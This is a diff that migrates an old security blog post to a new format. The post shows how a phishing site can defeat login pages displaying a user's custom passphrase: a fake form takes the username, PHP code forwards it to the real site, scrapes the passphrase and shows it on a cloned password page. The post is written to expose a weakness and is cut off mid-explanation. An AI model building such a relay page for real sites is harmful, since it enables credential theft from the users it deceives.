@@ -1,34 +1,23 @@
 ---
-author: aaron
-comments: true
-date: 2008-11-20 22:27:25+00:00
 layout: post
-slug: how-custom-passphrasespictures-still-dont-protect-against-phishing
 title: How custom passphrases/pictures still don't protect against phishing
-wordpress_id: 271
-categories:
-- security
 tags:
 - security
 ---
 
 As you probably remember, I have lots of interest in phishing techniques (I talked about one [here](/blog/2007/07/11/the-anatomy-of-a-phishing-attack-advanced-technique/), and preventing them [here](/blog/2007/07/11/the-top-17-ways-to-help-eliminate-the-phishing-threat/)).  I've noticed a new trend: a dual stage login form with a custom picture or passphrase.  Users are to gain trust in the login page because their custom configured option is displayed.  The more I started thinking about this, however, I kept seeing an issue - this still can be easily phished!  I'm going to demonstrate a method of phishing the passphrase version.  I don't want to do a picture example because it a) takes more code and b) more people have moved to that thinking it is more secure.  Lets go:
 
-
 First off, all phishing starts with getting the user to a login page not at the respected domain.  So, lets just skip that step, and examine our login page.  This will be a duplicate of our real site's login page - note the reminder that they will have to verify their passphrase.
 
 **login.php** @ fakedomain.com
 
-    
-    
-    <form action="login2.php" method="post">
-        <label>Username: <input name="username"></input><br></br>
-        <em>Remember, you will be asked to verify your passphrase on the next page.</em><br></br>
-        <input type="submit" value="Login"></input>
-    </form>
-    
-
-
+{% highlight HTML %}
+<form action="login2.php" method="post">
+    <label>Username: <input name="username"></input><br></br>
+    <em>Remember, you will be asked to verify your passphrase on the next page.</em><br></br>
+    <input type="submit" value="Login"></input>
+</form>
+{% endhighlight %}
 
 Very simple login which sends it to another page - hopefully named the same as the real domain's login page.
 
@@ -36,24 +25,23 @@ Lets look at the page we'll be submitting to:
 
 **login2.php** @ fakedomain.com
 
-    
-    
-        /** cutting out a lot of code - make sure its not empty, etc **/
-        $args = array ('username'=>$_POST['username']);
-        $uri = 'http://realdomain.com/login.do.php';
-         $opts = array('http'=>array('method'=>'POST', 'header'=>'Content-Type: application/x-www-form-urlencoded', 'content'=>http_build_query($args)));
-         $context = stream_context_create($opts);
-        $page_with_phrase = file_get_contents($uri, false, $context);
-    
-        $doc = new DomDocument();
-        $doc->loadHTML($page_with_phrase );
-    
-        $passphrase = $doc->getElementById('passphrase_node')->nodeValue;
-    
-        /** next login form page actually shows the $passphrase phrase and asks for password **/
-        include('next_login_form.php');
-    
+{% highlight PHP %}
+<?php    
+/** cutting out a lot of code - make sure its not empty, etc **/
+$args = array ('username'=>$_POST['username']);
+$uri = 'http://realdomain.com/login.do.php';
+ $opts = array('http'=>array('method'=>'POST', 'header'=>'Content-Type: application/x-www-form-urlencoded', 'content'=>http_build_query($args)));
+ $context = stream_context_create($opts);
+$page_with_phrase = file_get_contents($uri, false, $context);
 
+$doc = new DomDocument();
+$doc->loadHTML($page_with_phrase );
+
+$passphrase = $doc->getElementById('passphrase_node')->nodeValue;
+
+/** next login form page actually shows the $passphrase phrase and asks for password **/
+include('next_login_form.php');
+{% endhighlight %}
 
 
 Ok, first off, you'll see we create a nice post with our stream context creation ([detailed here](/blog/2008/11/14/posting-requests-in-php-without-curl/)) - so we basically send the username to the real domain as they had logged in.  (Depending on the target site, you might also have to send referrers, cookies, etc - but we're making it a really simple example here.)
